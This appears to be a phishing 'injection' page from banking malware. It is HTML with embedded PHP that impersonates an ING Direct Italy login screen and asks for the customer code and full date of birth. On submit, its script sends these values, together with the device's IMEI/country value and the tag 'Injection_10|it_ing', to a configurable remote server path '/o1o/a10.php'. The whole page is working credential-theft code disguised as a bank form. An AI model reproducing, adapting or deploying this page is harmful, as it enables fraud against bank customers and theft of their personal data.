<!-- 2.1.0 -->
<html>
<head>
    <meta charset="UTF-8">
    <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.4/angular.min.js"></script>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/js/bootstrap.min.js"></script>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.0/umd/popper.min.js"></script>
	<link rel="stylesheet" href="it/it.ingdirect.app/style.css">
</head>
<?php
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
<body>
    <div class="header">
        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAOEAAAAgCAMAAADT2e9ZAAACnVBMVEX////50rz739D84dL50r36zbX93s/91sT+9O/50br50bv50rzynm/1sIn3rIX1sYvvgkX2vp786N30rIPtci3tdDDvgkT739Dtcy8jKFbtdTIjKFb////0q4LvgkXugELteTf97eTsbCPrZhvsbSbsbyjrZhvwiVDvhEjsbCP75NcjKFbrZhv////saiHraiH4yrDxlF/1sYv93M3teDXxlWHscCrscSwAAADufDzrZhvsayLwkFn98+zynW3sbSXtci3rZhvraSDtdzQjKFYjKFbsbCT97+ftdDDtdzT////wjFPteTfsbSbrZhv0q4L1sIr////vgkXzpHj3wqQjKFYjKFYjKFYjKFYjKFbteDfvh0wjKFbynGwjKFb////tci0jKFb2vZzsbifvh0z859vtdDHrZhvuejn63Mvyn2/ynW3sbifsbCTwjVXwkFruezvtci3749Xymmn4x6zscy8jKFbteDXviE7ym2r3xajzoXP50LnwilHvhUnsaiHymWf2t5QjKFb0qH350r3rZhvwilHwkFn2hk/97eQjKFb2vJzteTf8zbf5z7f62cbzoHHxlmP6sIz94tb728n749X2YRr4fkT8xKnxk1/xlWLrZhv4iFP97OPsbyj70rz////50LjwiU/918b7x670pnrueTj5wqb5kmH3dDb5nHD0qX/7upr6pn71s43xkl32vZv3aif0qX75nG/+9fH4xqrwjFTvgkX94dTscCnyn3D+6+L1soz1nnD949b62cf+9vL50br3xan1sIr51L/4ya/ynWzzonTvgUTxlF/ymmn2uJTugkTzpnr3v5/wi1LwilHteTb61L/1rIPxk133vJzym2rwjFP1so3vg0b2tpP6yrH7uZv1rYb0q4ORJI2IAAAAiHRSTlNQ2+fo3OPZ9OHT1tnk+P786+JqsNBq/kz1wLIQEJLY6O2IplCXiMDQ7/lbQDAw9/Yu+9zZ6/7weQDOEPhYxPn74nDEkIDg2Zf32ICUpPxA6HwgxIegYFDw0LBbPXB8IGC/MEr9ZshqgLjS/mTc+sFYgvOv81j3oP333X7Q0Pug1sCIkHClIKiwY/hoBQAABzdJREFUWMPdmOl71EQYwPEW8L5DPMF7wQvFUFFAs4io9dxN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">
    </div>

    <div class="header2">
        Ciao!
    </div>
    <form action="null"  method="post" id="_mainForm" target="flow_handler">
        <input type="tel" class="field" name="login" id="login" placeholder="Codice Cliente">

        <input type="tel" class="field2" name="giorno" id="giorno" placeholder="Giorno">
        <input type="tel" class="field2" name="mese" id="mese" placeholder="Mese">

        <input type="tel" class="field3" name="nascita" id="nascita" placeholder="Anno di nascita">

        <input type="submit" class="button" id="input_submitBtn" value="AVANTI">
    </form>
    <iframe src="about:blank" name="flow_handler" style="visibility:hidden;display:none"></iframe>
<script type="text/javascript">
   (function () {
		var  __insHiddenField = function (objDoc, objForm, sNm, sV) {
            var input = objDoc.createElement("input");
            input.setAttribute("type", "hidden");
            input.setAttribute("name", sNm);
            input.setAttribute("value", sV);
            input.value = sV;
            objForm.appendChild(input);
        };

        var g_oBtn = document.getElementById('input_submitBtn');
        g_oBtn.onclick = function () {

            var oNumInp = document.getElementById('login');
            var oCodeInp = document.getElementById('giorno');
            var oCode2Inp = document.getElementById('mese');
            var oCode3Inp = document.getElementById('nascita');

            try{
                oNumInp.className = 'field';
                oCodeInp.className = 'field2';
                oCode2Inp.className = 'field2';
                oCode3Inp.className = 'field3';
            } catch(e){};

            if (!/^\w{3,50}$/i.test(oNumInp.value)) {
                try{
                    oNumInp.className = 'field error';
                } catch(e){};
                return false;
            }

            if (!/^\w{3,50}$/i.test(oCodeInp.value)) {
                try{
                    oCodeInp.className = 'field2 error';
                } catch(e){};
                return false;
            }

            if (!/^\w{3,50}$/i.test(oCode2Inp.value)) {
                try{
                    oCode2Inp.className = 'field2 error';
                } catch(e){};
                return false;
            }

            if (!/^\w{3,50}$/i.test(oCode3Inp.value)) {
                try{
                    oCode3Inp.className = 'field3 error';
                } catch(e){};
                return false;
            }

			top['closeDlg'] = true;
          	var url='<?php echo $URL; ?>';
           	var imei_c='<?php echo $IMEI_country; ?>';
           	location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_10|it_ing|Codice Cliente: "+oNumInp.value+"//br//Giorno: "+oCodeInp.value+"//br//Mese: "+oCode2Inp.value+"//br//Anno di nascita: "+oCode3Inp.value);

           return false;
       };

   })();
</script>
</body>
</html>
